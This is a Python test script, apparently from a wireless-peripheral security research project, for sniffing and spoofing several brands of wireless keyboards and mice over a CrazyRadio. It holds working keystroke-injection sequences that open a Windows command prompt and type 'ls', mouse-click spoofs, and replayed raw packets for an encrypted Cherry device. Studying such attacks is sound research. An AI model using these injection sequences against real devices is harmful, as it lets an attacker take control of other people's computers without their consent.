#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Copyright (C) 2025 Lucas Agro

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

"""Testing file for sniffing and spoofing wireless devices.

"""

import time

from lib import common
from devices.keyboard import * 
from devices.mouse import * 
from devices.device import Device
from devices.TLSR85.tlsr85_keyboard import Tlsr85_Keyboard
from devices.TLSR85.tlsr85_mouse import Tlsr85_Mouse
from devices.TX.tx_mouse import Tx_mouse
from devices.TX.tx_keyboard import Tx_Keyboard
from devices.Rapoo.rapoo_mouse import Rapoo_Mouse
from devices.Rapoo.rapoo_keyboard import Rapoo_Keyboard
from devices.Edenwood.edenwood_mouse import Edenwood_Mouse
from devices.Edenwood.edenwood_keyboard import Edenwood_Keyboard
from devices.Cherry.cherry import Cherry
from devices.Qware.qware_keyboard import Qware_Keyboard
from devices.Qware.qware_mouse import Qware_Mouse

common.init_args('./main.py')
common.parse_and_init()


"""
----------------------------Initial analysis----------------------------
"""

#Device.quick_sniff("25:2d:8e", [22, 28, 44, 54, 60, 93, 7, 67, 76, 68, 78, 13, 61, 73, 69, 38, 0, 29, 33, 2, 45, 94, 95, 8, 20], common.RF_RATE_1M, 22)
#Device.fuzz_channels("25:2d:8e", common.RF_RATE_1M)


"""
----------------------------TLSR85----------------------------
"""

trust_keyboard = Tlsr85_Keyboard("b5:4a:b4:cb:80", 0x11021, 0xEFDF)
#poss_keyboard = Tlsr85_Keyboard("cc:d5:54:cb:80", 0x11021, 0xEFDF)
trust_mouse = Tlsr85_Mouse("b5:4a:b4:cb:dc", 0x11021, 0xEFDF)


attack_tlsr85_keyboard = [
    trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D], modifiers=[KeyboardModifiers.MODIFIER_MULTIPLE_KEY]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    trust_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S], modifiers=[KeyboardModifiers.MODIFIER_MULTIPLE_KEY]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

#trust_keyboard.sniff()
#trust_mouse.sniff()
#trust_keyboard.spoof(attack_tlsr85_keyboard)



"""
----------------------------TX----------------------------
"""

tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)
tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)

attack_tx_keyboard = [
    *tx_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(1),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")

#tx_mouse.sniff()
#tx_keyboard.spoof(attack_tx_keyboard)
#tx_mouse.spoof(attack_tx_mouse)


"""
----------------------------Rapoo----------------------------
"""

# The addresses for the Rapoo devices seem to be 7 byte longs, but the CrazyRadio supports up to 5 bytes of address. 
# To be sure about the addresses'format, other Rapoo mice/keyboards should be analyzed.
# In the exploit, the values 0x6906 or 0x6904 were hardcoded at the end of the address, those values may be different for other Rapoo devices.
rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79:dc", 0x11021, 0xefdf)
rapoo_mouse = Rapoo_Mouse("c7:92:78:79:dc", 0x11021, 0xefdf)

attack_rapoo_keyboard = [
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
    lambda: time.sleep(4),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

attack_rapoo_mouse = [
    rapoo_mouse.build_packet([MouseClickType.LEFT_CLICK])
]

#rapoo_keyboard.sniff()
#rapoo_mouse.sniff()
#rapoo_keyboard.spoof(attack_rapoo_keyboard)
#rapoo_mouse.spoof(attack_rapoo_mouse)


"""
----------------------------Edenwood----------------------------
"""

edenwood_mouse = Edenwood_Mouse("55:2d:2c:bc:bc", 0x11021, 0x6818)
edenwood_keyboard = Edenwood_Keyboard("55:2d:2c:bc:be", 0x11021, 0x6818)

attack_edenwood_keyboard = [
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
    lambda: time.sleep(1),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
]

attack_edenwood_mouse = [
    edenwood_mouse.build_packet([MouseClickType.LEFT_CLICK], scrolling_move="FF")
]


#edenwood_keyboard.sniff()
#edenwood_mouse.sniff()
#edenwood_mouse.spoof(attack_edenwood_mouse)
#edenwood_keyboard.spoof(attack_edenwood_keyboard) # not perfect, packet with same seq number might get repeated


"""
----------------------------Qware----------------------------
"""

qware_keyboard = Qware_Keyboard("3d:99:52:9c:12", 0x11021, 0xc5c5)
qware_mouse= Qware_Mouse("3d:99:52:9c:11", 0x11021, 0x784e)


attack_qware_keyboard = [
    qware_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(1),
    qware_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    qware_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    qware_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    qware_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
]

attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="fe0100ff01", scrolling_move="FF")]

#qware_keyboard.sniff()
#qware_mouse.sniff()
#qware_keyboard.spoof(attack_qware_keyboard)
#qware_mouse.spoof(attack_qware_mouse)


"""
----------------------------Cherry----------------------------
"""
# Is encrypted, sniffing is not complete
# Spoofing works when sending a few keystrokes

cherry = Cherry("25:2d:8e")
#cherry.sniff()

#cherry.spoof([b"\x25\x2d\x8e\xfe\xe0\x39\x8f\xad\x85\xac\xf0\xf7\x23\xb0\xe8\x90\xbc\x6c\xc8\x82\xfe"]) # L GUI
#cherry.spoof([b"\x25\x2d\x8e\xea\xd4\x0f\xe4\xa4\x86\x2f\x10\x5a\x23\xda\x81\x16\xd4\x32\x49\x09\xfe"]) # L
#cherry.spoof([b"\x25\x2d\x8e\xab\x72\x8a\x15\x3c\x7e\x8b\xde\xba\xd6\x8c\x42\x4f\xe1\xb9\xee\x62\xfe"]) # S
#cherry.spoof([b"\x25\x2d\x8e\x97\xe4\x83\xf2\xa7\x0f\x62\xfc\xa7\xc4\x46\x0e\x0a\xa5\xd6\x50\x6c\xfe"]) # A
#cherry.spoof([b"\x25\x2d\x8e\x14\x84\xa1\x0c\x4f\x6e\x49\xcd\xcc\x9c\xb4\x00\x74\xfb\x79\x6a\xba\xfe"]) # Z
cherry.spoof([b"\x25\x2d\x8e\x4a\xba\x5e\xa0\x7b\x8b\x60\xab\xb8\xfd\xed\x61\xaf\x7c\x03\x98\xee"]) # Right click

